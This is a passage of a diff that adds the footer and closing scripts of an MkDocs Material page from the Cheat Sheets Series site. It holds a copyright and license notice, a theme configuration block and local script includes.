+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      ©Copyright <script>document.write(new Date().getFullYear())</script> - Cheat Sheets Series Team - This work is licensed under <a rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International</a>.
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.sections", "navigation.expand"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+    
+  </body>
+</html>
